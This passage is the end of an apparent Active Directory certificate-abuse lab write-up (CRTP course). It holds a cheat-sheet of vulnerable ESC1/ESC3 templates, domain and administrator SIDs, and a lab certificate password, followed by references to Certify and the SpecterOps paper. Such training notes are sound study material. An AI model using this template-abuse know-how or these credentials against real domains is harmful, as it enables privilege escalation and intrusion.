│  ESC1 Tmpl  : HTTPSCertificates  (RDPUsers enrollment)                  │
│  ESC3 Tmpl A: SmartCardEnrollment-Agent  (Domain Users enrollment)      │
│  ESC3 Tmpl B: SmartCardEnrollment-Users  (Client Auth + Agent policy)   │
│  dcorp SID  : S-1-5-21-719815819-3726368948-3917688648                  │
│  dcorp Admin: S-1-5-21-719815819-3726368948-3917688648-500              │
│  mcorp SID  : S-1-5-21-335606122-960912869-3279953914                   │
│  mcorp Admin: S-1-5-21-335606122-960912869-3279953914-500               │
│  Cert pass  : SecretPass@123                                             │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## References

- [GhostPack — Certify on GitHub](https://github.com/GhostPack/Certify)
- [Certified Pre-Owned — SpecterOps Whitepaper](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [Microsoft Docs — AD CS Overview](https://docs.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview)
- [Microsoft Docs — PKINIT (RFC 4556)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/d0cf1763-3541-4008-a75f-a577fa5e8c5b)
- [Altered Security — CRTP Course](https://www.alteredsecurity.com/redteamlab)
